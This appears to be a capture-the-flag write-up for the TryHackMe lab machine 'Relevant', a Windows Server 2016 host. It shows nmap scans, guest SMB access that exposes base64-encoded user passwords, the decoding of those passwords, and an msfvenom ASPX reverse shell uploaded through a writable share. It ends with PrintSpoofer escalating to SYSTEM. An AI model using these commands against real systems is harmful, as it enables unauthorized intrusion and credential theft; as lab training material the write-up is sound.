# Relevant

LHOST	10.8.127.74
RHOST	10.10.30.177

## Enumeration

### nmap

scanning all host's ports

```bash
root@thm:~/relevant# nmap -p- 10.10.30.177
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-29 08:19 UTC
Nmap scan report for 10.10.30.177
Host is up (0.10s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
```

further scanning using default scripts and version scan

```bash
root@thm:~/relevant# nmap -sC -sV -p 80,135,139,445,3389,49663,49667,49669 10.10.30.177
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-29 08:27 UTC
Nmap scan report for 10.10.30.177
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-09-29T08:28:27+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-09-28T07:32:52
|_Not valid after:  2022-03-30T07:32:52
|_ssl-date: 2021-09-29T08:29:07+00:00; 0s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-29T01:28:29-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-29T08:28:30
|_  start_date: 2021-09-29T07:33:14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.43 seconds
```

### smbclient

```bash
root@thm:~/relevant# smbclient -L 10.10.30.177
Enter WORKGROUP\GUEST's password:

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk
SMB1 disabled -- no workgroup available
```

```bash
root@thm:~/relevant# smbclient \\\\10.10.30.177\\nt4wrksv
Enter WORKGROUP\GUEST's password:
Try "help" to get a list of possible commands.
smb: \> ls
.                                   D        0  Sat Jul 25 21:46:04 2020
..                                  D        0  Sat Jul 25 21:46:04 2020
passwords.txt                       A       98  Sat Jul 25 15:15:33 2020

				7735807 blocks of size 4096. 4945729 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

download password.txt file

```txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

The passwords are encoded with base64, after decodeing we get bob and bill passwords

```txt
[User Passwords - Decoded]
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

### gobuster

No directory was found using gobuster.

## Exploit

On the port 49663 of the IIS server, the directory nt4wrksv seems to map server's files. We can upload a file and run a reverse shell.

First we generate a reverse shell using msfvenom then we upload it with smbclient and listen for the incoming connexion.

```bash
root@thm:~/relevant# msfvenom -p windows/x64/shell_reverse_tcp LHOST="10.8.127.74" LPORT=1337 --platform windows -a x64 -f aspx > shell.aspx
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3403 bytes
```

```bash
root@thm:~/relevant# smbclient \\\\10.10.30.177\\nt4wrksv
Enter WORKGROUP\GUEST's password:
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (5.6 kb/s) (average 5.6 kb/s)
```

```bash
root@thm:~/relevant# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.8.127.74] from (UNKNOWN) [10.10.30.177] 49768
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

navigating to bob's desktop we found the first flag user.txt 

```
C:\Users\Bob\Desktop>type root.txt
type root.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

```bash
c:\Users>systeminfo
systeminfo

Host Name:                 RELEVANT
OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00378-00000-00000-AA739
Original Install Date:     7/25/2020, 7:56:59 AM
System Boot Time:          9/29/2021, 1:48:10 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
    [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
    BIOS Version:              Xen 4.11.amazon, 8/24/2006
    Windows Directory:         C:\Windows
    System Directory:          C:\Windows\system32
    Boot Device:               \Device\HarddiskVolume1
    System Locale:             en-us;English (United States)
    Input Locale:              en-us;English (United States)
    Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
    Total Physical Memory:     512 MB
    Available Physical Memory: 99 MB
    Virtual Memory: Max Size:  1,536 MB
    Virtual Memory: Available: 748 MB
    Virtual Memory: In Use:    788 MB
    Page File Location(s):     C:\pagefile.sys
    Domain:                    WORKGROUP
    Logon Server:              N/A
    Hotfix(s):                 N/A
    Network Card(s):           1 NIC(s) Installed.
    [01]: AWS PV Network Device
    Connection Name: Ethernet 2
    DHCP Enabled:    Yes
    DHCP Server:     10.10.0.1
    IP address(es)
    [01]: 10.10.30.177
    [02]: fe80::41c9:1021:83cf:7a4f
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We can note that this machine is a virtual machine using xen and running windows server 2016.

In order to escalate privilages, I used PrintSpoofer abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.


[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

First I uploaded the exploit to `nt4wrksv` then run the exploit from the server to get admin shell

```bash
root@thm:~/relevant# smbclient \\\\10.10.30.177\\nt4wrksv
Enter WORKGROUP\GUEST's password:
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (20.6 kb/s) (average 20.6 kb/s)
```

```bash
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

then we find the second flag on administrator directory.

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```
